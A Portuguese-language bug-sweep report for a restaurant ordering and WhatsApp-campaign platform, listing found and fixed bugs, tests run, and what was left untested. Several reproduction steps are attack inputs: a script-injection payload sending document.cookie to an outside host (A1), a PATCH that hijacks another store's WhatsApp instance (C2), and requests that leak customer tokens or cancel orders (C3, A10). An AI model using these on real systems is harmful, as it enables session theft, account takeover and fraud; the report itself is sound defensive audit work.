# Varredura de bugs — 2026-09-29 (noite)

Branch **`fix/varredura-2026-09-29`** (a partir da main `76147ee`), com push. **Sem merge, sem deploy,
sem migration aplicada em produção.** Tudo o que foi testado com envio de WhatsApp rodou no ambiente
local com o provedor **simulado**.

---

## 1. Resumo executivo

- Encontrei **59 problemas**: 3 críticos, 12 altos, 25 médios, 19 baixos. **28 já estão corrigidos** na
  branch (1 deles em parte), cada um em commit próprio com teste automatizado; o resto está documentado abaixo
  com a proposta de correção para você decidir.
- **Mais grave corrigido — dinheiro:** item com tamanhos (açaí, marmita) saía **de graça** quando entrava
  pelo "Peça também" da vitrine (o servidor cobrava o preço-base, que é R$ 0).
- **Mais grave corrigido — segurança:** o ID do pixel do Facebook/Google Tag era colado cru dentro de um
  script da vitrine; um atendente conseguia injetar código que roda no mesmo domínio do painel
  (roubo da sessão do dono ou do suporte).
- **Disparos:** a fila é sólida (sem envio duplicado, sem reenvio após queda, isolamento entre lojas ok),
  mas havia bugs no **público** (loja com mais de 1000 clientes/pedidos recebia o público errado —
  ex.: cliente ativo caindo em "inativos"), no **fuso** (editar campanha empurrava o horário 3h) e em
  campanhas sem público/exclusão no meio do envio. Todos corrigidos.
- **O que mais precisa da sua decisão (não corrigi porque mexe em banco/regra):**
  1. **Não existe descadastro (opt-out)**: quem responde "SAIR" continua recebendo campanhas.
  2. **Uma loja consegue "sequestrar" o WhatsApp de outra** trocando `evolution_instance` direto pela
     API do Supabase (nome da instância é `menuzia-<id da loja>`, e o id é público). Correção: 1 linha de migration.
  3. **Fallback do código de verificação** entrega a conta (token, nome, endereço, prêmios) de qualquer
     cliente cujo telefone alguém digitar, quando o WhatsApp da loja está fora.
  4. **Atendente/cozinha conseguem cancelar pedido de mesa/balcão direto pela API**, sem motivo nem
     auditoria (inclusive de conta já fechada).
- **Teste real de campanha NÃO foi feito:** a instância da loja Menuzia (final 9932) estava
  **desconectada** a noite toda. As instâncias conectadas são de outras lojas — não usei.
- Regressão depois das correções: **1694 testes unitários** e **8 suítes e2e locais (545 verificações)** + o roteiro novo de disparos
  passando; `tsc` e `lint` limpos.

---

## 2. Tabela de bugs (por gravidade)

Status: **✅ Corrigido** (commit) · **⏳ Pendente** (proposta na última coluna).

### Crítico

| ID | Área/Tela | Descrição | Como reproduzir | Impacto | Status | Proposta |
|---|---|---|---|---|---|---|
| C1 | Vitrine / pedido | Item com tamanhos sem `tamanhoNome` era cobrado pelo preço-base do item (R$ 0 no açaí/marmita). O "Peça também" só abria a ficha com grupo obrigatório, então colocava o item sem tamanho. | Configurar açaí (tamanhos, preço 0) como "Peça também" e tocar em "+"; ou POST `/api/loja/X/pedido` sem `tamanhoNome`. | Produto sai de graça. | ✅ `3dfaaef` | — |
| C2 | Segurança / WhatsApp | Dono, gerente **ou atendente** de qualquer loja muda `restaurantes.evolution_instance` pelo PostgREST para `menuzia-<id de outra loja>` (id é público). Depois: vê o número, **desconecta** o WhatsApp da vítima e **envia** avisos/OTP/campanhas pelo número dela. | `PATCH /rest/v1/restaurantes?id=eq.<minha>` `{"evolution_instance":"menuzia-<vítima>"}` com a sessão do atendente. | Derrubar/banir o WhatsApp de outra loja, spam em nome dela. | ⏳ | Migration: `revoke update (evolution_instance) on public.restaurantes from authenticated;` + índice único em `evolution_instance`. Nenhuma tela grava essa coluna pelo navegador (só `conectar`, com service_role). |
| C3 | Segurança / checkout | Fallback do OTP (WhatsApp da loja fora ou loja sem WhatsApp) devolve o **token permanente** do cliente já cadastrado com aquele telefone. Com o token: nome, endereço, histórico de pedidos, trocar endereço e **usar os prêmios** dele. Pedido com o telefone da vítima sai "verificado". | Loja sem WhatsApp: `POST /api/loja/<slug>/conta/codigo {"telefone":"<cliente>"}` → resposta traz `token`, `nome`, `endereco`. | Vazamento de dados pessoais, roubo de prêmio, trote. | ⏳ | No fallback, nunca devolver token/dados de cliente existente: sessão efêmera só para o checkout (sem acesso a `/conta*` e a prêmios) e pedido "não verificado". É decisão de produto (muda o fluxo da sacola). |

### Alto

| ID | Área/Tela | Descrição | Como reproduzir | Impacto | Status | Proposta |
|---|---|---|---|---|---|---|
| A1 | Segurança / vitrine | Pixel do Facebook e Google Tag injetados crus dentro de `<script>`. A tela valida, mas a coluna aceita qualquer texto e atendente grava direto. | `update restaurantes set facebook_pixel_id = $$');fetch('https://x/?c='+document.cookie);('$$` e abrir a vitrine. | Código de terceiro roda em app.menuzia.com.br (sessão do dono/suporte). | ✅ `7e4aadd` | Complementar: CHECK no banco para os dois campos (migration). |
| A2 | Disparos | **Não há descadastro.** Cliente que responde SAIR/PARAR continua recebendo. Nenhuma coluna/regra. | QA local cenário 3: resposta "SAIR", 2ª campanha chega. | Reclamação, denúncia de spam e **banimento do número** (aí param também os avisos de pedido). | ⏳ | Migration: tabela `whatsapp_descadastro (restaurante_id, telefone_chave, em, origem)`; robô reconhece SAIR/PARAR/STOP/CANCELAR (responde confirmando); `resolverDestinatarios` exclui; rodapé opcional "Responda SAIR para não receber". |
| A3 | Disparos | Público lia só **1000** clientes e só os **1000 pedidos mais antigos** (limite do PostgREST). | Loja com >1000 pedidos: filtro "inativos" pega cliente que pediu ontem; "recentes" vem vazio; >1000 clientes, o resto nunca recebe. | Mensagem para o público errado. | ✅ `146b22d`, `23ffd97` | — |
| A4 | Dashboard / Clientes | Mesmo limite de 1000 pedidos no Dashboard e em Clientes. | Loja com >1000 pedidos: pedido de hoje e cliente novo não aparecem. | Faturamento, ticket e ranking errados. | ✅ `125df43` | Melhoria: agregar no banco / filtrar pelo período (hoje lê todo o histórico). |
| A5 | Checkout / OTP | `/conta/codigo` sem limite: qualquer um dispara WhatsApp do número da loja para qualquer número; reenvio zerava as 5 tentativas; contador não atômico. | Loop de POST com números aleatórios. | Banimento do número da loja; força bruta do código. | ✅ `c13aff2` | Complementar: limite por IP (precisa de infraestrutura). |
| A6 | Cozinha (estação) | Despacho de rotas pela estação (link sem login) não avisava "saiu para entrega": o aviso ia pelo navegador e dava 401 calado. | Tablet só com link da cozinha → despachar. | Cliente não sabe que o pedido saiu. | ✅ `e41925c` | — |
| A7 | Segurança / cozinha | `GET /api/cozinha/<token>/rotas` devolvia o **token de cada entregador**; rotas de despacho não conferiam o modo da estação. | Link de estação "Produção" → abrir `/entregador/<token>` e marcar entregue/cancelar. | Qualquer um com o link da cozinha opera como entregador. | ✅ `8a50610` | Complementar: token do entregador rotacionável. |
| A8 | Logística / caixa | Fechamento de caixa do entregador soma **todo o histórico** (não zera após "Registrar fechamento") e "troco levado" soma `troco_para` (nota do cliente), não o troco. | Dia 1 fecha R$ 50; dia 2 entrega R$ 30 → esperado R$ 80, diferença −R$ 50. | Caixa não fecha. | ⏳ | Contar só pedidos depois do último `fechado_em` do entregador (ou do dia em SP) e usar `trocoALevar` (lib/troco.ts). É regra de negócio: confirmar "período do fechamento". |
| A9 | Checkout | Grupo obrigatório com "permite quantidade": vitrine manda Chocolate ×3, servidor contava opções distintas → "Escolha 3 opções". | Grupo "Escolha 3 bolas" (mín. 3, permite quantidade), escolher 3× a mesma. | Venda perdida. | ✅ `291f625` | Garçom/mesa/PDV não enviam o campo (comportamento antigo mantido); avaliar se precisam. |
| A10 | PDV / mesas | Atendente (balcão) ou cozinha (mesa) dá `UPDATE status='cancelado'` direto no PostgREST; o gatilho aceita qualquer cancelamento presencial. | Console do painel como atendente: `supabase.from('pedidos').update({status:'cancelado'}).eq('id', <pedido de balcão entregue>)`. | Fura motivo, regra "atendente só cancela recebido sem pagamento", conferência de pago e auditoria; faturamento cai depois de receber. **Caminho de fraude.** | ⏳ | Migration: no gatilho `pedidos_transicao_valida`, recusar `cancelado` de canal mesa/balcão com `comanda_id` quando `auth.role()='authenticated'` (as rotas do servidor usam service_role). |
| A11 | Segurança | Tokens legados do Assistente de impressão ainda não rotacionados (antes da 0080 qualquer logado lia os de todas as lojas). | — (pendência conhecida). | Acesso cruzado à fila de impressão (nome/telefone/endereço de clientes). | ⏳ | Rotacionar os tokens legados de todas as lojas. |
| A12 | Dependências | Next 15.5.19 com aviso **crítico** (DoS e SSRF em Server Actions); postcss, sharp, nanoid com avisos altos. | `npm audit --omit=dev`. | Indisponibilidade. | ⏳ | `npm audit fix` (sobe Next dentro da 15.5 e o resto sem quebra) + build e e2e antes de publicar. |

### Médio

| ID | Área/Tela | Descrição | Impacto | Status | Proposta |
|---|---|---|---|---|---|
| M1 | Disparos | Editar campanha agendada mostrava a hora em UTC e salvar regravava como local: **+3h a cada edição**. | Campanha sai 3h depois. | ✅ `fdffba3` | — |
| M2 | Disparos | Telefone inválido ("123", 16 dígitos) entrava na fila e virava "falha"; estimativa da tela contava repetidos e inválidos (5 × 4 enviados). | Relatório com falha falsa; número na tela ≠ enviado. | ✅ `1a52351` | — |
| M3 | Disparos | Campanha sem ninguém no público ficava "Agendada" para sempre. | Tela confusa. | ✅ `c1f81ce` | — |
| M4 | Disparos | Excluir campanha **durante o envio** apagava a fila (e as métricas do que já saiu). | Perde o controle do que foi enviado. | ✅ `c1f81ce` | — |
| M5 | Disparos | Filtro "dia da semana" usava o dia em UTC (domingo 21h contava como segunda). | Público errado. | ✅ `a277287` | — |
| M6 | Disparos | WhatsApp desconectado durante a campanha: cada envio vira "erro" (4xx) ou gasta as 3 tentativas — a campanha inteira é queimada. **Aconteceu em produção:** campanha "SDAASD" da Menuzia (28/09 01:14): 4 destinatários, 0 enviados, 3× "HTTP 400 … Error: Connection Closed" na 1ª tentativa e 1× HTTP 500 após 3; a lista mostra "Concluída". | Campanha perdida sem aviso. | ⏳ | Antes de reservar, checar a conexão da instância; desconectada → pula a loja (fila fica pendente, dentro das 24h) e mostra aviso na tela. |
| M7 | Disparos | Fila **global**: 5 envios por minuto somando TODAS as lojas, em ordem de chegada. Campanha grande de uma loja segura as das outras; acima de ~7.200 destinatários pendentes, o fim expira (24h). | Promoção do almoço chega à noite. | ⏳ | Rodízio por loja na `campanha_reservar_envios` (migration) e/ou vazão por instância. |
| M8 | Central / disparos | Saída gravada na conversa do número **com** o 9; resposta chega pelo número que o WhatsApp informa (em muitos, **sem** o 9) → **duas conversas** para o mesmo cliente. | Atendente não vê o disparo/aviso na conversa em que está. | ⏳ (parte ✅) | ✅ `7e9c411`: o eco agora é reconhecido (antes silenciava o robô 12h). Falta unir as conversas: `whatsapp_registrar_saida` reaproveitar a conversa existente de qualquer forma do número (migration). |
| M9 | Robô | Resposta do robô reagendada (falha temporária) saía depois que o atendente assumia. | Menu no meio do atendimento humano. | ✅ `8be0e00` | — |
| M10 | Robô | Reação 👍, edição, mensagem apagada viravam "mídia" → robô respondia "Não entendi". | Cliente irritado; não lida falsa. | ✅ `20fb03b` | — |
| M11 | Nexta | Evento atrasado (ex. DELIVERY_ONGOING após CANCELLED) reativava a entrega; com redespacho, webhook 500 em loop. | Redespacho barrado / reenvio infinito. | ✅ `1d43ffd` | — |
| M12 | Impressão | Com "Impressão automática" desligada, o Beta (dono da Cozinha) perguntava 2–4 vezes por segundo, sem parar. | Carga/egresso contínuos. | ✅ `8cee2c4` | — |
| M13 | Impressão | Assistente não confere se o "impresso" chegou ao servidor: recibo/pré-conta **reimprime até 5×** se o aviso falhar (502 no redeploy). | Recibo duplicado; painel mostra "falhou". | ⏳ | No `printer-agent`: `informarResultado` com `res.ok` + novas tentativas; guardar ids já impressos (como `impressos.json`). Precisa de novo beta — **não mexe no layout**. |
| M14 | PDV v2 | "Receber" trocava a chave de idempotência em qualquer falha (inclusive resposta perdida) → pagamento em dobro. | Caixa a menos. | ✅ `763aef8` | — |
| M15 | PDV | "10.50" (teclado Android) virava 1050: desconto zerando a conta, recebido de R$ 5.000. | Valores absurdos gravados. | ✅ `1196879` | — |
| M16 | PDV antigo | Loja sem `pdv_v2` (padrão de loja nova): modal mostra o total sem taxa de serviço e grava o `restante` (com taxa). | Caixa não bate. | ⏳ | GET da comanda devolver `comanda_totais` e o modal usar o `restante`. Hoje as 8 lojas estão no v2 (impacto só em loja nova). |
| M17 | Mesas | Cupom na conta de mesa só é consumido no "Fechar conta" completo; `conta.fechar`/"Resolver e fechar" fecham sem gravar o uso. | `max_usos` e uso único não valem. | ⏳ | Em `fechar()`/`resolver()` recusar conta com cupom sem uso gravado ("Use Fechar conta"). Mexe em dinheiro → sua decisão. |
| M18 | Mesas | Juntar mesas apaga taxa manual e desconto da mesa de origem. | Couvert some. | ⏳ | 409 pedindo para lançar a taxa no destino, ou somar (decisão de negócio). |
| M19 | Logística / entregador | Portal do entregador zerava "concluídos hoje"/caixa às **21h** (UTC). | Pico da noite. | ✅ `36cef93` | Também usar `entregue_em` em vez de `atualizado_em` no caixa do dia. |
| M20 | Entregador | "Não entregue" pelo app cancelava sem motivo/autor/hora e sem avisar o cliente. | Pedido some do caixa sem rastro. | ✅ `9858972` | — |
| M21 | Checkout | Troco recusado (total do servidor ≠ tela) depois de reservar prêmio/cupom: prêmio ficava "resgatado" para sempre. | Cliente perde o prêmio. | ✅ `5e1acdc` | — |
| M22 | Checkout | Categoria com horário (Almoço 11–15h) não conferida no servidor. | Pedido fora do horário entra. | ✅ `445467b` | — |
| M23 | Fidelidade | Cupom "primeira compra"/"recompra" usa histórico cortado em 1000 pedidos. | Cliente antigo ganha cupom de primeira compra. | ⏳ | Filtrar por telefone no banco (variantes normalizadas) — telefone está gravado em formatos variados. |
| M24 | Checkout | Pedido público sem idempotência (resposta perdida → 2 pedidos); `quantidade` sem teto (estoura `int` e deixa pedido sem itens). | Pedido duplicado. | ⏳ | Chave por checkout na vitrine + índice da 0065; teto de quantidade (ex. 999). |
| M25 | Segurança | `/cadastro` deixa qualquer um assumir convite pré-autorizado (sem prova de posse do e-mail); `verificar-email` enumera lojistas. | Tomada do cadastro. | ⏳ | Convite com link de uso único; resposta única no verificar-email. |

### Baixo

| ID | Área | Descrição | Status | Proposta |
|---|---|---|---|---|
| B1 | Checkout | Subtotal em ponto flutuante (3 × 19,90 = 59,6999…): frete grátis "acima de 59,70" falhava. | ✅ `f90e113` | — |
| B2 | Logística | "Entregue" sem conferir status mandava o WhatsApp de entregue 2×. | ✅ `6acef90` | — |
| B3 | Fidelidade | Reversão dupla do cancelamento liberava prêmio já usado em outro pedido. | ✅ `750cc17` | — |
| B4 | Mesas | Módulo de mesas desligava com conta de mesa aberta sem pedido. | ✅ `7693d52` | — |
| B5 | PDV antigo | Erro do "Fechar" não aparece (operador acha que fechou). | ⏳ | Mostrar `data.error` em `setLaunchMsg`. |
| B6 | Impressão | Pedido "recebido" sem limite de idade: ligar a impressão imprime todo o acumulado. | ⏳ | `criado_em >= now() - 6h` também para `recebido` (migration de função). |
| B7 | Impressão | Upload da logo lê o corpo inteiro antes de checar 800 KB. | ⏳ | 413 por `content-length`. |
| B8 | Robô | Cada nova tentativa cria outra mensagem no histórico ("falhou" + "enviado"). | ⏳ | Registrar só na 1ª tentativa. |
| B9 | Central | Envio do atendente com resultado "incerto" responde "Tente de novo" → mensagem dupla. | ⏳ | Mensagem "pode ter sido enviada, confira no celular". |
| B10 | Robô | Trava de 60 s curta para lote de até 20 × 15 s → estado "incerto" errado (sem duplicar). | ⏳ | Lote menor ou trava maior. |
| B11 | Robô | Se `enfileirar` falhar após registrar a entrada, o reenvio do webhook vira "duplicada" e o cliente fica sem resposta. | ⏳ | Na duplicada sem envio, reenfileirar. |
| B12 | Disparos | Texto do formulário "Deixe em branco para disparar imediatamente" contradiz a validação. | ⏳ | Trocar o texto. |
| B13 | Disparos | `registrarDisparo`/concluir com erro aborta o lote → restantes viram "incerto" (nunca enviados). | ⏳ | try/catch por envio. |
| B14 | Segurança | Bucket `cardapio` listável pelo anon (fotos enviadas pela central). | ⏳ | Policy de SELECT restrita (migration). |
| B15 | Segurança | Link de recuperação de senha usa `Origin`/`Host`. | ⏳ | URL fixa (conferir allowlist de redirect no Supabase). |
| B16 | Segurança | Login sem limite na aplicação; `redefinir-senha` troca sem a senha atual; `/eventos` aceita insert anônimo; `/pedido/[id]` ignora o slug. | ⏳ | Rate limit, pedir senha atual, validar slug. |
| B18 | Campanhas | Erro React #418 (hidratação) ao abrir /admin/campanhas: a prévia do WhatsApp fica montada com a gaveta fechada e, com "incluir link" ligado, não está vazia — mostra `horaAgora()`, que o servidor calcula em UTC e o navegador em São Paulo. Só console (React refaz no cliente). | ⏳ | Hora da prévia só depois de montar (useEffect) ou `suppressHydrationWarning` no span. |
| B19 | Campanhas | Barra de progresso soma enviados + erros: campanha com 4 falhas e 0 enviados aparece "Concluída · 4/4" com a barra cheia azul (só um "4 erro(s)" pequeno embaixo). O motivo da falha no detalhe é o JSON cru do provedor. | ⏳ | Barra só com enviados (falhas em vermelho) e motivo traduzido ("WhatsApp da loja desconectado"). |
| B17 | Checkout | Dia de disponibilidade do item em turno que passa da meia-noite usa o dia do calendário. | ⏳ | Decisão: "dia" = dia do turno? |

---

## 3. DISPAROS (detalhe)

**Como testei:** li todo o código (painel, APIs, `lib/queries/campanhas.ts`, `lib/mensageria/*`, cron,
0021/0104, webhook de status, link `/c/<token>`, histórico da central). Testes locais com provedor
simulado: suíte existente **e2e-campanhas-metricas 62/62** e o roteiro novo
**`scripts/seguranca/qa-disparos-varredura.mjs`** (9 cenários). Robô 106/106 e central 71/71 também
passaram depois das correções.

| Verificação pedida | Resultado |
|---|---|
| Variáveis `{nome}` | **Não existe.** Só `{link}`. `{nome}` sai literal. (Melhoria — a tela não promete.) |
| Acentos, emoji, texto longo (3 mil+), link | ✅ intactos; `{link}` trocado pelo link próprio de cada cliente; sem link a mensagem sai como escrita. |
| Mídia (imagem/áudio) e pré-visualização | ✅ pelo código e pela e2e (imagem com legenda, áudio sem link). |
| Contagem prevista = enviada | ❌→✅ corrigido (M2). |
| Sem telefone / inválido / duplicado / +55 / 9º dígito | Duplicado ✅ (com/sem 55, com/sem 9, banco também barra); inválido ❌→✅ (M2). |
| Loja com >1000 clientes/pedidos | ❌→✅ (A3). |
| Opt-out / bloqueio | ❌ **não existe** (A2) — pendente. |
| Agendamento: fuso | ❌→✅ editar (M1); "dia da semana" (M5). Horário novo é gravado certo (ISO do navegador). |
| Data passada | Sai na hora; > 24h de atraso expira sem enviar ✅. |
| Editar/cancelar agendada | ✅ cancelar vira "cancelado" e nada sai; campanha que começou não é editada (409). |
| WhatsApp desconectado | ❌ queima a campanha (M6) — pendente. |
| Intervalo entre mensagens | 4–12 s aleatório, 5 por minuto (global — ver M7). |
| Reinício do servidor no meio | ✅ o que estava em envio vira "incerto" e **não** é reenviado; o resto sai. |
| Idempotência / dois crons | ✅ `skip locked`; dois crons simultâneos não repetem ninguém. |
| Retry com erro do provedor / timeout | ✅ transitório até 3 tentativas (+1 min, +5 min); timeout = "incerto" (nunca reenvia). |
| Status e contadores | ✅ enviadas/falhas/incertas/pendentes batem com a fila (e2e). |
| Histórico na central marcado "disparo" | ✅ (origem `disparo`). Ressalva: número sem 9 abre 2 conversas (M8). |
| Isolamento entre lojas | ✅ público só da própria loja, instância da própria loja; RLS de envios ok. **Mas** ver C2 (troca de instância). |
| Resposta do cliente | ✅ eco da campanha não silencia o robô; resposta vai para o robô/atendente normalmente. |
| Avisos transacionais durante disparo grande | ✅ avisos de pedido/fidelidade/código saem por envio direto, fora da fila da campanha. |
| Pausa e retomada | **Não existe pausa** (só cancelar). Melhoria. |
| Teste real para 5527992534407 | **Não feito** — ver §6. |

---

## 4. Riscos de segurança

1. **C2** — troca de `evolution_instance` entre lojas (migration de 1 linha). **Prioridade 1.**
2. **C3** — fallback do OTP entrega dados/token de clientes.
3. **A10** — cancelamento presencial direto pela API (fraude de caixa).
4. **A11** — tokens legados do Assistente ainda por rotacionar.
5. **A12** — Next com aviso crítico (atualizar).
6. **M25** — convite de cadastro sem prova de posse; enumeração de lojistas.
7. Corrigidos nesta branch: A1 (script injetado pelo pixel), A5 (spam/força bruta do código), A7 (token
   dos entregadores pelo link da cozinha).
8. Menores: B14–B16.
9. Largo por desenho: atendente pode alterar **qualquer** configuração da loja (taxas, slug, horário,
   pixels) direto no banco (policy da 0066). Vale restringir colunas sensíveis a dono/gerente.

---

## 5. Melhorias sugeridas (não são bugs)

- Campanhas: variáveis `{nome}`/`{primeiro_nome}`; botão **Pausar/Retomar**; aviso na tela quando o
  WhatsApp da loja está desconectado; limite diário por loja; prévia exatamente como sai (com link).
- Dashboard: agregar no banco por período (hoje lê todo o histórico da loja a cada abertura).
- Rotação do token do entregador pelo painel.
- `npm audit` no CI.
- Dois avisos de lint (`react-hooks/exhaustive-deps`) em `app/admin/pedidos/page.tsx:702` e
  `app/entregador/[token]/page.tsx:97`.

---

## 6. O que NÃO foi possível testar (e por quê)

- **Teste real de campanha para 5527992534407:** a instância da loja Menuzia (`menuzia-824468ae…`,
  final 9932) estava com status **`close` (desconectada)** nas duas consultas (≈04:40 e 05:07 UTC) (leitura em
  `/instance/fetchInstances`). As instâncias conectadas são de outras lojas; pela regra 2 não usei.
  **Nenhuma mensagem real foi enviada.** Para fazer depois: reconectar a Menuzia e rodar o roteiro da
  §7 (fica em 1 mensagem).
- Envio a impressoras físicas: não (regra 3). Impressão coberta por código e pelas suítes locais.
- Pagamentos reais: não há gateway no fluxo; nada criado.
- Teste de carga: não (regra 1). Desempenho: medi o carregamento das telas da Menuzia (tabela na §7).
- Mobile em produção: conferido por código/e2e (e2e de campanhas e mesas têm verificação a 390 px);
  não percorri todas as telas no celular.
- Checkout real da vitrine em produção: exige OTP no WhatsApp (desconectado) — não criei pedido em
  produção.

---

## 7. Checklist final

Ver `checklist.md` nesta pasta (todas as telas/rotas marcadas).

### Suítes rodadas depois das correções (local, provedor simulado)

| Suíte | Resultado |
|---|---|
| vitest (unitários) | 1694 ✅ · 0 ❌ (10 pulados, já existentes) |
| e2e-campanhas-metricas | 62/62 |
| qa-disparos-varredura (novo) | 9 cenários: 6 ✅, 3 🐞 pendentes (opt-out, desconectado, fila global) + `{nome}` |
| e2e-robo-whatsapp | 106/106 |
| e2e-atendimento-whatsapp | 71/71 |
| e2e-regressao-release | 52/52 |
| e2e-estabilidade-operacional | 53/53 |
| e2e-pdv-v2 | 70/70 |
| e2e-garcom | 47/47 |
| e2e-balcao-entrega | 84/84 |
| tsc / lint / build | limpos (2 avisos de lint antigos) |

### Produção — loja Menuzia (somente leitura)

Sessão já aberta no Chrome; loja conferida pelo link `/loja/menuzia` antes de qualquer ação. Cada tela
carregada por 6–7 s capturando erros de console e requisições com status ≥ 400. Nada foi salvo.

| Tela | Erros de console | Requisições com falha |
|---|---|---|
| /admin/dashboard | — | — |
| /admin/pedidos | — | — |
| /admin/pdv | — | — |
| /admin/mesas | — | — |
| /admin/logistica | — | — |
| /admin/cardapio | — | — |
| /admin/clientes | — | — |
| /admin/campanhas | **React #418 (hidratação)** — ver B18 | — |
| /admin/fidelidade | — | — |
| /admin/integracoes | — | — |
| /admin/integracoes/nexta | — | — |
| /admin/equipe | — | — |
| /admin/impressao | — | — |
| /admin/ajustes | — | — |
| /admin/auditoria | — | — |
| /loja/menuzia | — | — |

Observado: barra vermelha "Novo sistema de impressão disponível" aparecendo; aviso "3 pendências" no
menu (checklist de configuração); WhatsApp da loja Menuzia desconectado (ver §6) — com ele fora, o
checkout da vitrine da Menuzia entra no fallback sem OTP (ver C3).

